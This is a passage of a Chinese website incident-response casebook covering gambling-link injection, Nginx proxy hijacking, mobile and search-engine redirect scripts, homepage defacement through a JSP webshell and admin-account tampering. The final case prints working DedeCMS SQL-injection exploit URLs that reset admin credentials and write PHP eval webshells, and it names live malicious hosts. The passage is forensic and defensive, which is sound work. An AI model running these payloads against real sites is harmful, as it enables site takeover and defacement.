75b\uff0c\u5f15\u722c\u866b\u6536\u5f55\u3002\u5728\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u7f51\u7ad9\u5730\u5740\u65f6\uff0c\u6536\u5f55\u4e86\u4e00\u4e9b\u4f1a\u51fa\u73b0\u4e00\u4e9b\u535a\u5f69\u9875\u9762\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u5f62\u8c61\u3002 \u539f\u56e0\u5206\u6790 \u00b6 \u7f51\u7ad9\u5b58\u5728\u9ad8\u5371\u6f0f\u6d1e\uff0c\u5e38\u89c1\u4e8e\u4e00\u4e9b\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\u7684\u5f00\u6e90CMS\uff0c\u5229\u75280day\u6279\u91cf\u62ff\u7ad9\u4e0a\u4f20\u9ed1\u9875\u3002 \u73b0\u8c61\u63cf\u8ff0\uff1a \u00b6 \u67d0\u7f51\u7ad9\u88ab\u6302\u4e86\u975e\u5e38\u591a\u535a\u5f69\u94fe\u63a5\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.com/upload/aomendduchangzaixiandobo/index.html http://www.xxx.com/upload/aomendduchangzaixian/index.html http://www.xxx.com/upload/aomenzhengguidubowangzhan/index.html \u94fe\u63a5\u53ef\u4ee5\u8bbf\u95ee\uff0c\u76f4\u63a5\u8bbf\u95ee\u7269\u7406\u8def\u5f84\u4e5f\u53ef\u4ee5\u770b\u5230\u6587\u4ef6\uff0c\u4f46\u662f\u6253\u5f00\u7f51\u7ad9\u76ee\u5f55\u5e76\u6ca1\u6709\u53d1\u73b0\u8fd9\u4e9b\u6587\u4ef6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u5230\u5e95\u85cf\u5728\u4e86\u54ea\uff1f \u8bbf\u95ee\u8fd9\u4e9b\u94fe\u63a5\uff0c\u8df3\u8f6c\u5230\u5982\u56fe\u9875\u9762\uff1a \u95ee\u9898\u5904\u7406\uff1a \u00b6 1\u3001\u6253\u5f00\u7535\u8111\u6587\u4ef6\u5939\u9009\u9879\u5361\uff0c\u53d6\u6d88\u201d\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6\u201c\u52fe\u9009\uff0c\u628a\u201d\u9690\u85cf\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u201c\u4e0b\u9762\u7684\u5355\u9009\u9009\u62e9\u201c\u663e\u793a\u9690\u85cf\u7684\u6587\u4ef6\u3001\u6587\u4ef6\u5939\u548c\u9a71\u52a8\u5668\u201d\u3002 2\u3001\u518d\u6b21\u67e5\u770b\uff0c\u53ef\u4ee5\u770b\u5230\u534a\u900f\u660e\u7684\u6587\u4ef6\u5939\uff0c\u6e05\u695a\u9690\u85cf\u6587\u4ef6\u5939\u53ca\u6240\u6709\u9875\u9762 3\u3001\u7136\u540e\u6e05\u9664IIS\u4e34\u65f6\u538b\u7f29\u6587\u4ef6 C:\\inetpub\\temp\\IIS Temporary Compressed Files\\WEBUI$ _gzip_D \\WEB\\WEBUI\\UPLOAD 4\u3001\u6295\u8bc9\u5feb\u7167\uff0c\u7533\u8bf7\u5220\u9664\u76f8\u5173\u7684\u7f51\u9875\u6536\u5f55\uff0c\u51cf\u5c11\u5bf9\u7f51\u7ad9\u7684\u5f71\u54cd\u3002 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u00b6 \u65b0\u95fb\u6e90\u7f51\u7ad9\u4e00\u822c\u6743\u91cd\u8f83\u9ad8\uff0c\u6536\u5f55\u5feb\uff0c\u80fd\u591f\u88ab\u641c\u7d22\u5f15\u64ce\u4f18\u5148\u6536\u5f55\uff0c\u662f\u9ed1\u7070\u4ea7\u63a8\u5e7f\u5f15\u6d41\u7684\u5fc5\u4e89\u4e4b\u5730\uff0c\u5f88\u5bb9\u6613\u6210\u4e3a\u88ab\u653b\u51fb\u7684\u5bf9\u8c61\u3002\u88ab\u9ed1\u4ee5\u540e\u4e3b\u8981\u6302\u7684\u4e0d\u826f\u4fe1\u606f\u5185\u5bb9\u4e3b\u8981\u662f\u535a\u5f69\u516d\u5408\u5f69\u7b49\u8d4c\u535a\u7c7b\u5185\u5bb9\uff0c\u65b0\u95fb\u6e90\u7f51\u7ad9\u7a0b\u5e8f\u65e0\u8bba\u662f\u81ea\u4e3b\u5f00\u53d1\u7684\u8fd8\u662f\u5f00\u6e90\u7a0b\u5e8f\uff0c\u90fd\u6709\u88ab\u9ed1\u7684\u53ef\u80fd\uff0c\u5f00\u6e90\u7a0b\u5e8f\u66f4\u5bb9\u6613\u88ab\u9ed1\u3002 \u73b0\u8c61\u63cf\u8ff0\uff1a \u00b6 \u67d0\u65b0\u95fb\u6e90\u7f51\u7ad9\u9996\u9875\u5e7f\u544a\u94fe\u63a5\u88ab\u52ab\u6301\u5230\u83e0\u83dc\u7f51\u7ad9 \u6709\u4e09\u4e2a\u5e7f\u544a\u4e13\u9898\uff0c\u94fe\u63a5\u5f62\u5f0f\u5982\u4e0b\uff1a http://www.xxx.cn/zhuanti/yyysc/index.shtml http://www.xxx.cn/zhuanti/wwwsc/index.shtml http://www.xxx.cn/zhuanti/zzzsc/index.shtml \u70b9\u51fb\u8fd9\u4e09\u6761\u94fe\u63a5\u4f1a\u8df3\u8f6c\u5230\u535a\u5f69\u7f51\u7ad9\u3002\u7b80\u5355\u6293\u5305\u5206\u6790\u4e00\u4e0b\u8fc7\u7a0b\uff1a \u53ef\u4ee5\u53d1\u73b0\u6b64\u65f6\u8fd9\u4e2a\u8fd4\u56de\u9875\u9762\u5df2\u88ab\u52ab\u6301\uff0c\u5e76\u4e14\u52a0\u8f7d\u4e86\u7b2c\u4e09\u65b9js\u6587\u4ef6\uff0c http://xn--dpqw2zokj.com/N/js/dt.js \uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8be5\u6587\u4ef6\uff1a dt.js\u8fdb\u4e00\u6b65\u52a0\u8f7d\u4e86\u53e6\u4e00\u6761js\uff0c\u8bbf\u95eehttp://xn--dpqw2zokj.com/N/js/yz.js \u6211\u4eec\u53d1\u73b0\u94fe\u63a5\u8df3\u8f6c\u5230https://lemcoo.com/?dt\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee\u8fd9\u4e2a\u94fe\u63a5\uff0c\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\uff0c\u8bbf\u95ee\u540e\u4f1a\u968f\u673a\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u8d4c\u535a\u7f51\u7ad9\u3002 \u95ee\u9898\u5904\u7406\uff1a \u00b6 \u627e\u5230url\u5bf9\u5e94\u7684\u6587\u4ef6\u4f4d\u7f6e\uff0c\u5373\u4f7f\u6587\u4ef6\u88ab\u5220\u9664\uff0c\u94fe\u63a5\u4f9d\u7136\u53ef\u4ee5\u8bbf\u95ee\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e09\u6761\u94fe\u63a5\u90fd\u662f\u4ee5\u201csc\u201d\u540e\u7f00\u3002 \u5bf9Nginx\u914d\u7f6e\u6587\u4ef6\u8fdb\u884c\u6392\u67e5\uff0c\u53d1\u73b0Nginx\u914d\u7f6e\u6587\u4ef6VirtualHost.conf\u88ab\u7be1\u6539\uff0c\u901a\u8fc7\u53cd\u5411\u4ee3\u7406\u5339\u914d\u4ee5\u201csc\u201d\u540e\u7f00\u7684\u4e13\u9898\u94fe\u63a5\uff0c\u52ab\u6301\u5230 http://103.233.248.163 \uff0c\u8be5\u7f51\u7ad9\u4e3a\u535a\u5f69\u94fe\u63a5\u5bfc\u822a\u7f51\u7ad9\u3002 \u5220\u9664\u6076\u610f\u4ee3\u7406\u540e\uff0c\u4e13\u9898\u94fe\u63a5\u8bbf\u95ee\u6062\u590d\u3002 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u00b6 PC\u7aef\u8bbf\u95ee\u6b63\u5e38\uff0c\u79fb\u52a8\u7aef\u8bbf\u95ee\u51fa\u73b0\u5f02\u5e38\uff0c\u6bd4\u5982\u63d2\u5165\u5f39\u7a97\u3001\u5d4c\u5165\u5f0f\u5e7f\u544a\u548c\u8df3\u8f6c\u5230\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u5c06\u5e72\u6270\u7528\u6237\u7684\u6b63\u5e38\u4f7f\u7528\uff0c\u5bf9\u7528\u6237\u4f53\u9a8c\u9020\u6210\u6781\u5927\u4f24\u5bb3\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u90e8\u5206\u7f51\u7ad9\u7528\u6237\u53cd\u9988\uff0c\u624b\u673a\u6253\u5f00\u7f51\u7ad9\u5c31\u4f1a\u8df3\u8f6c\u5230\u8d4c\u535a\u7f51\u7ad9\u3002 \u95ee\u9898\u5904\u7406 \u00b6 \u8bbf\u95ee\u7f51\u7ad9\u9996\u9875\uff0c\u6293\u53d6\u5230\u4e86\u4e00\u6761\u6076\u610fjs\uff1a http://js.zadovosnjppnywuz.com/caonima.js \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u8fd9\u6bb5js\u4ee3\u7801\u5224\u65ad\u624b\u673a\u8bbf\u95ee\u6765\u6e90\uff0c\u52ab\u6301\u79fb\u52a8\u7aef\uff08\u5982\u624b\u673a\u3001ipad\u3001Android\u7b49\uff09\u6d41\u91cf\uff0c\u8df3\u8f6c\u5230 https://262706.com\u3002 \u8fdb\u4e00\u6b65\u8bbf\u95ee https://262706.com\uff0c\u8df3\u8f6c\u5230\u8d4c\u535a\u7f51\u7ad9\uff1a \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u00b6 \u5f53\u4f60\u76f4\u63a5\u6253\u5f00\u7f51\u5740\u8bbf\u95ee\u7f51\u7ad9\uff0c\u662f\u6b63\u5e38\u7684\uff0c\u53ef\u662f\u5f53\u4f60\u5728\u641c\u7d22\u5f15\u64ce\u7ed3\u679c\u9875\u4e2d\u6253\u5f00\u7f51\u7ad9\u65f6\uff0c\u4f1a\u8df3\u8f6c\u5230\u4e00\u4e9b\u5176\u4ed6\u7f51\u7ad9\uff0c\u6bd4\u5982\u535a\u5f69\uff0c\u865a\u5047\u5e7f\u544a\uff0c\u6dd8\u5b9d\u641c\u7d22\u9875\u9762\u7b49\u3002\u662f\u7684\uff0c\u4f60\u53ef\u80fd\u4e86\u9047\u5230\u641c\u7d22\u5f15\u64ce\u52ab\u6301\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u4ece\u641c\u7d22\u5f15\u64ce\u6765\u7684\u6d41\u91cf\u81ea\u52a8\u8df3\u8f6c\u5230\u6307\u5b9a\u7684\u7f51\u9875 \u95ee\u9898\u5904\u7406 \u00b6 \u901a\u8fc7\u5bf9index.php\u6587\u4ef6\u8fdb\u884c\u4ee3\u7801\u5206\u6790\uff0c\u53d1\u73b0\u8be5\u6587\u4ef6\u4ee3\u7801 \u5bf9\u6765\u81ea\u641c\u72d7\u548c\u597d\u641c\u7684\u8bbf\u95ee\u8fdb\u884c\u6d41\u91cf\u52ab\u6301\u3002 \u8fdb\u4e00\u6b65\u8ddf\u7740include\u51fd\u6570\u5305\u542b\u7684\u6587\u4ef6\uff0cindex,php\u5305\u542b/tmp/.ICE-unix/.. /c.jpg\u3002 \u8fdb\u5165/tmp\u76ee\u5f55\u8fdb\u884c\u67e5\u770b\uff0c\u53d1\u73b0\u8be5\u76ee\u5f55\u4e0b\uff0c\u5982c.jpg\u7b49\u6587\u4ef6\uff0c\u5305\u542b\u7740\u4e00\u5957\u535a\u5f69\u52ab\u6301\u7684\u7a0b\u5e8f\u3002 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u00b6 \u7f51\u7ad9\u9996\u9875\u88ab\u975e\u6cd5\u7be1\u6539\uff0c\u662f\u7684\uff0c\u5c31\u662f\u4f60\u4e00\u6253\u5f00\u7f51\u7ad9\u5c31\u77e5\u9053\u81ea\u5df1\u7684\u7f51\u7ad9\u51fa\u73b0\u4e86\u5b89\u5168\u95ee\u9898\uff0c\u7f51\u7ad9\u7a0b\u5e8f\u5b58\u5728\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u4e0a\u4f20\u811a\u672c\u6728\u9a6c\uff0c\u4ece\u800c\u5bf9\u7f51\u7ad9\u5185\u5bb9\u8fdb\u884c\u7be1\u6539\u3002\u800c\u8fd9\u79cd\u7be1\u6539\u4e8b\u4ef6\u5728\u67d0\u4e9b\u573a\u666f\u4e0b\uff0c\u4f1a\u88ab\u65e0\u9650\u653e\u5927\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u7f51\u7ad9\u9996\u9875\u88ab\u6076\u610f\u7be1\u6539\uff0c\u6bd4\u5982\u590d\u5236\u539f\u6765\u7684\u56fe\u7247\uff0cPS\u4e00\u4e0b\uff0c\u7136\u540e\u66ff\u6362\u4e0a\u53bb\u3002 \u95ee\u9898\u5904\u7406 \u00b6 1\u3001 \u786e\u8ba4\u7be1\u6539\u65f6\u95f4 \u901a\u8fc7\u5bf9\u88ab\u7be1\u6539\u7684\u56fe\u7247\u8fdb\u884c\u67e5\u770b\uff0c\u786e\u8ba4\u56fe\u7247\u7be1\u6539\u65f6\u95f4\u4e3a2018\u5e7404\u670818\u65e5 19:24:07 \u3002 2\u3001\u8bbf\u95ee\u65e5\u5fd7\u6eaf\u6e90 \u901a\u8fc7\u56fe\u7247\u4fee\u6539\u7684\u65f6\u95f4\u8282\u70b9\uff0c\u53d1\u73b0\u53ef\u7591IP\uff1a113.xx.xx.24 \uff08\u4ee3\u7406IP\uff0c\u65e0\u6cd5\u8ffd\u6eaf\u771f\u5b9e\u6765\u6e90\uff09\uff0c\u8bbf\u95eeimage.jsp\uff08\u811a\u672c\u6728\u9a6c\uff09\uff0c\u5e76\u968f\u540e\u8bbf\u95ee\u4e86\u88ab\u7be1\u6539\u7684\u56fe\u7247\u5730\u5740\u3002 \u8fdb\u4e00\u6b65\u5ba1\u67e5\u6240\u6709\u7684\u65e5\u5fd7\u6587\u4ef6(\u65e5\u5fd7\u4fdd\u5b58\u65f6\u95f4\u4ece2017-04-20\u81f32018-04-19)\uff0c\u53d1\u73b0\u4e00\u5171\u53ea\u6709\u4e24\u6b21\u8bbf\u95eeimage.jsp\u6587\u4ef6\u7684\u8bb0\u5f55\uff0c\u5206\u522b\u662f2018-04-18\u548c2017-09-21\u3002 image.jsp\u57282017-09-21\u4e4b\u524d\u5c31\u5df2\u7ecf\u4e0a\u4f20\u5230\u7f51\u7ad9\u670d\u52a1\u5668\uff0c\u5df2\u7ecf\u6f5c\u85cf\u957f\u8fbe\u534a\u5e74\u591a\u751a\u81f3\u66f4\u4e45\u7684\u65f6\u95f4\u3002 3\u3001\u5bfb\u627e\u771f\u76f8 \u6211\u4eec\u5728\u7f51\u7ad9\u6839\u76ee\u5f55\u627e\u5230\u4e86\u7b54\u6848\uff0c\u53d1\u73b0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u5b58\u5728ROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\uff0c\u5907\u4efd\u65f6\u95f4\u4e3a2017-02-28 10:35\u3002 \u901a\u8fc7\u5bf9ROOT.rar\u89e3\u538b\u7f29\uff0c\u53d1\u73b0\u6e90\u7801\u4e2d\u5b58\u5728\u7684\u811a\u672c\u6728\u9a6c\u4e0e\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\u7684\u53ef\u7591\u6587\u4ef6\u540d\u4e00\u81f4\uff08image.jsp\uff09\u3002 \u6839\u636e\u8fd9\u51e0\u4e2a\u65f6\u95f4\u8282\u70b9\uff0c\u6211\u4eec\u5c1d\u8bd5\u53bb\u8fd8\u539f\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 \u4f46\u662f\u6211\u4eec\u5728\u8bbf\u95ee\u65e5\u5fd7\u5e76\u672a\u627e\u5230ROOT.rar\u7684\u8bbf\u95ee\u4e0b\u8f7d\u8bb0\u5f55\uff0c\u8bbf\u95ee\u65e5\u5fd7\u53ea\u4fdd\u7559\u4e86\u8fd1\u4e00\u5e74\u7684\u8bb0\u5f55\uff0c\u800c\u8fd9\u4e2awebshell\u53ef\u80fd\u5df2\u7ecf\u5b58\u5728\u4e86\u591a\u5e74\u3002 \u9ed1\u5ba2\u662f\u5982\u4f55\u83b7\u53d6webshell\u7684\u5462\uff1f \u53ef\u80fd\u662f\u901a\u8fc7\u4e0b\u8f7dROOT.rar\u5168\u7ad9\u6e90\u7801\u5907\u4efd\u6587\u4ef6\u83b7\u53d6\u5230\u5176\u4e2d\u5b58\u5728\u7684\u6728\u9a6c\u4fe1\u606f\uff0c\u6216\u8005\u51e0\u5e74\u524d\u5165\u4fb5\u5e76\u6f5c\u85cf\u4e86\u591a\u5e74\uff0c\u53c8\u6216\u8005\u662f\u4ece\u5730\u4e0b\u9ed1\u4ea7\u8d2d\u4e70\u4e86shell\uff0c\u6211\u4eec\u4e0d\u5f97\u800c\u77e5\u3002 \u672c\u6587\u7684\u793a\u4f8b\u4e2d\u653b\u51fb\u8005\u4e3a\u6211\u4eec\u7559\u4e0b\u4e86\u5927\u91cf\u7684\u8bc1\u636e\u548c\u8bb0\u5f55\uff0c\u800c\u66f4\u591a\u65f6\u5019\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6e05\u9664\u6240\u6709\u7684\u5173\u952e\u4fe1\u606f\uff0c\u8fd9\u52bf\u5fc5\u4f1a\u52a0\u5927\u8c03\u67e5\u4eba\u5458\u7684\u53d6\u8bc1\u96be\u5ea6\u3002 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u00b6 \u4f60\u662f\u67d0\u4e00\u4e2a\u7f51\u7ad9\u7684\u7ba1\u7406\u5458\uff0c\u6709\u4e00\u5929\uff0c\u4f60\u7684\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u767b\u5f55\u4e0d\u4e86\uff0c\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u770b\uff0c\u539f\u6765\u7ba1\u7406\u5458\u8d26\u53f7\u7528\u6237\u540d\u4e0d\u5b58\u5728\u4e86\uff0c\u5374\u591a\u4e86\u53e6\u5916\u4e00\u4e2a\u7ba1\u7406\u5458\u7528\u6237\u540d\u3002\u4e0d\u5bf9\uff0c\u4e0d\u662f\u65b0\u589e\u4e86\u7ba1\u7406\u5458\uff0c\u800c\u662f\u4f60\u7684\u7ba1\u7406\u5458\u7528\u6237\u540d\u88ab\u7be1\u6539\u4e86\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u524d\u540e\u7aef\u5206\u79bb\uff0c\u540e\u53f0\u53ea\u5141\u8bb8\u5185\u7f51\u8bbf\u95ee\uff0c\u7ba1\u7406\u5458\u8d26\u53f7admin\u5374\u4f9d\u7136\u88ab\u591a\u6b21\u88ab\u7be1\u6539 \u95ee\u9898\u5904\u7406 \u00b6 1\u3001\u7f51\u7ad9webshell \u5728\u9488\u5bf9\u7f51\u7ad9\u6839\u76ee\u5f55\u8fdb\u884cwebshell\u626b\u63cf\uff0c\u53d1\u73b0\u5b58\u5728\u811a\u672c\u6728\u9a6c\uff0c\u521b\u5efa\u65f6\u95f4\u4e3a2018-06-13 04:30:30 2\u3001 \u5b9a\u4f4dIP \u901a\u8fc7\u6728\u9a6c\u521b\u5efa\u65f6\u95f4\uff0c \u67e5\u770b\u7f51\u7ad9\u8bbf\u95ee\u65e5\u5fd7\uff0c\u5b9a\u4f4d\u5230IP\u4e3a\uff1a180.xx.xx.3 3\u3001\u5173\u8054\u5206\u6790 \u5168\u5c40\u641c\u7d22\u4e0e\u8be5IP\u6709\u5173\u7684\u64cd\u4f5c\u65e5\u5fd7\uff1a \u5728\u811a\u672c\u6728\u9a6c\u751f\u6210\u524d\uff0c\u6709\u4e24\u6761\u6bd4\u8f83\u53ef\u7591\u7684\u8bbf\u95ee\u65e5\u5fd7\u5438\u5f15\u4e86\u6211\u4eec\u7684\u6ce8\u610f\uff1a 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=114&arrs2[]=101&arrs2[]=97&arrs2[]=100&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=120&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=109&arrs2[]=79&arrs2[]=111&arrs2[]=110&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=32&arrs2[]=87&arrs2[]=72&arrs2[]=69&arrs2[]=82&arrs2[]=69&arrs2[]=32&arrs2[]=96&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 HTTP/1.1\" 200 67 172.16.1.12 180.xx.xxx.3 - - [10/Jun/2018:08:41:43 +0800] \"GET /plus/ad_js.php?aid=19 HTTP/1.1\" 200 32 \u5bf9\u8fd9\u6bb5POC\u8fdb\u884c\u89e3\u7801\uff0c\u6211\u4eec\u53d1\u73b0\u901a\u8fc7\u8fd9\u4e2apoc\u53ef\u4ee5\u5f80\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u6570\u636e\uff0c\u8fdb\u4e00\u6b65\u8bbf\u95ee/plus/ad_js.php?aid=19 \u5373\u53ef\u5728plus\u76ee\u5f55\u751f\u6210read.php\u811a\u672c\u6587\u4ef6\u3002 \u89e3\u7801\u540e\uff1a cfg_dbprefixmyad SET normbody = '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE aid` =19 # \u7efc\u4e0a\uff0c\u53ef\u4ee5\u63a8\u6d4b/plus/download.php\u4e2d\u53ef\u80fd\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\uff0c\u63a5\u4e0b\u6765\uff0c\u6536\u96c6\u7f51\u4e0a\u5df2\u516c\u5f00\u7684\u6709\u4ee5\u4e0b3\u79cdEXP\u8fdb\u884c\u6f0f\u6d1e\u590d\u73b0\u3002 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5229\u7528\u65b9\u5f0f\u4e00\uff1a\u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458 1\u3001\u65b0\u5efa\u7ba1\u7406\u5458\u8d26\u53f7test/test123789\uff0c\u53ef\u4ee5\u6210\u529f\u767b\u5f55\u7f51\u7ad9\u540e\u53f0 2\u3001\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a cfg_dbprefixadmin SETuserid='spider',pwd`='f297a57a5a743894a0e4' where id=19 # \u4fee\u6539\u540e\u53f0\u7ba1\u7406\u5458\u4e3a\uff1a\u7528\u6237\u540dspider\uff0c\u5bc6\u7801admin\u3002 \uff083\uff09\u5bf9\u5e94\u7684EXP: \uff1fopen=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=97&arrs2[]=100&arrs2[]=109&arrs2[]=105&arrs2[]=110&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=117&arrs2[]=115&arrs2[]=101&arrs2[]=114&arrs2[]=105&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=115&arrs2[]=112&arrs2[]=105&arrs2[]=100&arrs2[]=101&arrs2[]=114&arrs2[]=39&arrs2[]=44&arrs2[]=32&arrs2[]=96&arrs2[]=112&arrs2[]=119&arrs2[]=100&arrs2[]=96&arrs2[]=61&arrs2[]=39&arrs2[]=102&arrs2[]=50&arrs2[]=57&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=55&arrs2[]=97&arrs2[]=53&arrs2[]=97&arrs2[]=55&arrs2[]=52&arrs2[]=51&arrs2[]=56&arrs2[]=57&arrs2[]=52&arrs2[]=97&arrs2[]=48&arrs2[]=101&arrs2[]=52&arrs2[]=39&arrs2[]=32&arrs2[]=119&arrs2[]=104&arrs2[]=101&arrs2[]=114&arrs2[]=101&arrs2[]=32&arrs2[]=105&arrs2[]=100&arrs2[]=61&arrs2[]=49&arrs2[]=57&arrs2[]=32&arrs2[]=35 \u6267\u884cEXP\u540e\uff0c\u76f8\u5e94\u540e\u53f0\u6570\u636e\u5e93\u8868\u53d8\u4e3a\u5982\u4e0b\uff1a \uff084\uff09\u56e0\u6b64\u76f8\u5e94\u540e\u53f0\u767b\u5f55\u7528\u6237\u53d8\u4e3aspider\u5bc6\u7801admin \u5229\u7528\u65b9\u5f0f\u4e8c\uff1a\u901a\u8fc7/plus/mytag_js.php\u6587\u4ef6\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6cphp \uff081\uff09\u5982\uff1a\u6784\u9020\u5982\u4e0b\u6ce8\u5165SQL\u8bed\u53e5\uff1a `cfg_dbprefixmytag(aid,expbody,normbody) VALUES(9013,@\\','{dede:php}file_put_contents(''90sec.php'',''<?php eval($_POST[guige]);?>'');{/dede:php}') # @\\'`` \uff082\uff09\u5bf9\u5e94\u7684EXP: ?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=101&arrs2[]=120&arrs2[]=112&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=49&arrs2[]=51&arrs2[]=44&arrs2[]=64&arrs2[]=96&arrs2[]=92&arrs2[]=39&arrs2[]=96&arrs2[]=44&arrs2[]=39&arrs2[]=123&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=58&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=125&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&arrs2[]=36&arrs2[]=95&arrs2[]=80&arrs2[]=79&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=93&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=